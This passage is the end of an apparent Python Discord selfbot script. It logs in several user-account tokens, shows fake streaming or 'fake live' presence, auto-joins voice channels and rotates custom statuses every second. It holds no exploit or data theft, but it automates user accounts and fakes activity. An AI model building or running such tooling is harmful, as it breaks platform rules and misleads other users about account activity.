            self.nhay_stop_event.set()
        self.running = False
        try:
            if self.ws:
                self.ws.close()
        except Exception:
            pass


# ─── CUSTOM STATUS LOOP ──────────────────────────────────────────────────────

def custom_status_loop(token, custom_texts):
    index = 0
    while True:
        change_custom_status(token, custom_texts[index])
        index = (index + 1) % len(custom_texts)
        time.sleep(1)


# ─── MAIN ────────────────────────────────────────────────────────────────────

def main():
    config = load_config()

    if websocket is None:
        print("Cannot find websocket-client (pip install websocket-client)")
        return

    tokens = load_tokens(config)
    if not tokens:
        print("[!] No token found in config.txt")
        return

    app_id           = config.get("application_id", "").strip()
    auto_custom      = config.get("autochangecustomstatus", "False").lower() == "true"
    auto_change_stream = config.get("autochangestream", "False").lower() == "true"
    _env_st = os.environ.get("START_TIME", "").strip().strip('"').strip("'")
    _cfg_st = config.get("start_time", "now").strip().strip('"').strip("'")
    start_time_mode  = _env_st or _cfg_st or "now"
    start_time       = resolve_start_time(start_time_mode)
    _src = "Railway env" if _env_st else "config.txt"
    print(f"[*] start_time: {start_time_mode!r} (from {_src}) → {start_time} seconds")

    sc          = None
    asset_cache = {}
    if app_id:
        sc = load_stream_config()
        if sc is None or not sc.get("line1"):
            sc = None
            print("[!] stream.txt missing or line1 not set — stream disabled for all tokens")

    gateways    = []
    first_token = None

    for idx, token in enumerate(tokens, start=1):
        account_name, user_id = check_token(token)
        if not account_name:
            print(f"[!] Token {idx} invalid — skipped")
            continue

        rpc_type      = int(get_per_token(config, "rpc_type", idx) or "2")
        rpc_name      = get_per_token(config, "rpc_name", idx) or "Nova"
        auto_voice    = get_per_token(config, "auto_join_voice", idx).lower() == "true"
        guild_id      = get_per_token(config, "guild_id", idx)
        voice_ch      = get_per_token(config, "voice_channel_id", idx)
        token_stream  = get_per_token(config, "stream",   idx).lower() == "true"
        token_fakelive= get_per_token(config, "fakelive", idx).lower() == "true"
        _sb_suffix    = "" if idx == 1 else f"_{idx}"
        _sb_val       = (os.environ.get(f"SELFBOT{_sb_suffix}", "").strip().lower()
                         or os.environ.get("SELFBOT", "true").strip().lower())
        token_commands= _sb_val not in ("false", "0", "off", "no")
        env_suffix = "" if idx == 1 else f"_{idx}"
        guild_id   = os.environ.get(f"GUILD_ID{env_suffix}", "").strip() or guild_id
        voice_ch   = os.environ.get(f"VOICE_CHANNEL_ID{env_suffix}", "").strip() or voice_ch

        cur_cache = {}
        if token_stream and sc:
            ti_str = "" if idx == 1 else f"_{idx}"
            image_url = sc.get(f"image_url{ti_str}", "") or sc.get("image_url", "")
            cur_cache = preload_assets(token, app_id, image_url)

        activity = None
        if token_stream and sc:
            activity = build_activity_from_slot(
                sc, 1, app_id, cur_cache, start_time, rpc_type, rpc_name, token_index=idx
            )

        gw = DiscordGateway(
            token=token,
            user_id=user_id,
            account_name=account_name,
            activity=activity,
            stream_config=sc if token_stream else None,
            app_id=app_id if token_stream else None,
            auto_change_stream=auto_change_stream if token_stream else False,
            asset_cache=cur_cache,
            start_time=start_time,
            auto_join_voice=auto_voice,
            guild_id=guild_id,
            voice_channel_id=voice_ch,
            fakelive=token_fakelive,
            rpc_type=rpc_type,
            rpc_name=rpc_name,
            token_index=idx,
            commands_enabled=token_commands,
        )
        gw.start()
        gateways.append(gw)

        print(f"[*] Connected | {account_name} | rpc_name={rpc_name} | rpc_type={rpc_type} | stream={token_stream} | fakelive={token_fakelive} | start_time={start_time}")
        if auto_voice:
            print(f"[*] [{account_name}] Auto join voice: {voice_ch}")
        if token_fakelive:
            print(f"[*] [{account_name}] Fake live enabled")

        if idx == 1:
            first_token = token

    if not gateways:
        print("[!] No valid tokens. Exiting.")
        return

    original_custom = None
    if auto_custom and first_token:
        custom_texts = load_custom_statuses()
        if len(custom_texts) <= 1:
            print("[!] customstatus.txt needs at least 2 lines — disabled")
            auto_custom = False
        else:
            original_custom = get_current_custom_status(first_token)

    def restore(sig, frame):
        for gw in gateways:
            gw.stop()
        if auto_custom and first_token and original_custom is not None:
            restore_custom_status(first_token, original_custom)
        sys.exit(0)

    signal.signal(signal.SIGINT, restore)

    if auto_custom and first_token:
        custom_status_loop(first_token, custom_texts)
    else:
        while True:
            time.sleep(1)


if __name__ == "__main__":
    main()
